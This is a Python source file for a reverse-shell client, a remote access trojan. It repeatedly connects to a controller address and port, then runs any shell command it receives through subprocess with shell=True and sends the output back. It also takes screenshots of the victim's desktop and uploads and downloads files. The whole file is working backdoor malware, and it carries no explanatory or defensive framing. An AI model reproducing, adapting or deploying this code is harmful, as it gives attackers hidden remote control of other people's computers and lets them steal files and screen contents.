import socket
import subprocess
import time
import json
import os
import pyautogui
import base64

HOST_IP = '127.0.0.1' 
PORT = 5555
def cmd_recv(): # recieve command to be executed
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def output_send(data): # send command output to server
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())    


def upload_file(file_name): # upload file to server
    f = open(file_name, 'rb') 
    sock.send(f.read()) # send to the server

def download_file(file_name): # download file to server
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()


def shell(): # execute the recieved shell commads
    while True:
        command = cmd_recv()
        if command == ':kill':
            break
        elif command[:3] == 'cd ': # comparing the 1st 3 characters
            os.chdir(command[3:]) # changing directory to the specified location after cd

        elif command == 'help':
            pass
            
        elif command == 'clear':
            pass

        elif command == 'screenshot':
            image = pyautogui.screenshot()
            image.save('scrn.png')
            upload_file('scrn.png')
            os.remove('scrn.png')

        elif command[:8] == 'download':
            upload_file(command[9:])
            
        elif command[:6] == 'upload':
            download_file(command[7:])


        else:
            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            output_send(result)


def connection(): # establishing a connection with server
    while True:
        time.sleep(10)
        try:
            sock.connect((HOST_IP, PORT))
            shell()
            sock.close()
            break

        except:
            connection()
    



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
